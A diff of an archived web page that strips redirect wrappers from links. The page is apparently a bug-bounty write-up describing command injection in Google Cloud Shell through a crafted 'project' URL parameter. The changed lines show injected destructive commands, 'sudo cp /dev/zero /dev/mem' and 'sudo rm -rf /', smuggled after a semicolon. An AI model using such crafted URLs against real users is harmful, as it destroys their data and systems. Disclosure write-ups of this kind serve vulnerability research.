@@ -40,8 +40,8 @@
 	}
 	else	// Load Rest of YUI remotely (where possible)
 	{
-		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
-		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var yuipath = 'http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = 'http://yui.yahooapis.com/combo';
 		var remoteyui = true;
 		if (!yuicombopath)
 		{
@@ -582,7 +582,7 @@ On activating cloud shell "there was some syntax error"<br/>
 Now the creepy mind of  mine came with idea :P to use delimiter ,<br/>
 <br/>
 Crafted the url as ,<br/>
-<a href="../external.html?link=https://console.cloud.google.com/home/dashboard?project=;" target="_blank">https://console.cloud.google.com/hom...oard?project=;</a><br/>
+<a href="https://console.cloud.google.com/home/dashboard?project=;" target="_blank">https://console.cloud.google.com/hom...oard?project=;</a><br/>
 <br/>
 There was no syntax error , and  cloudshell created successfully!<br/>
 <br/>
@@ -592,13 +592,13 @@ To make this as exploitable issue , I came with these ideas,,<br/>
 <br/>
 Crashing Victim vm :<br/>
 <br/>
-<a href="../external.html?link=https://console.cloud.google.com/home/dashboard?project=;sudo" target="_blank">https://console.cloud.google.com/hom...?project=;sudo</a> cp /dev/zero /dev/mem<br/>
+<a href="https://console.cloud.google.com/home/dashboard?project=;sudo" target="_blank">https://console.cloud.google.com/hom...?project=;sudo</a> cp /dev/zero /dev/mem<br/>
 Once victim access the above url and click "Activate cloud shell" , his/her vm crashes.<br/>
 <br/>
 <br/>
 Deleting files: (this one had much impact than previous command)<br/>
 <br/>
-<a href="../external.html?link=https://console.cloud.google.com/home/dashboard?project=;sudo" target="_blank">https://console.cloud.google.com/hom...?project=;sudo</a> rm -rf /  <br/>
+<a href="https://console.cloud.google.com/home/dashboard?project=;sudo" target="_blank">https://console.cloud.google.com/hom...?project=;sudo</a> rm -rf /  <br/>
 This will delete victims root directory which also deletes appengine files!<br/>
 <br/>
 According to my research: Once the victim access the crafted url , Victim must click "Activate cloud shell" , in order to make the attack successful!<br/>
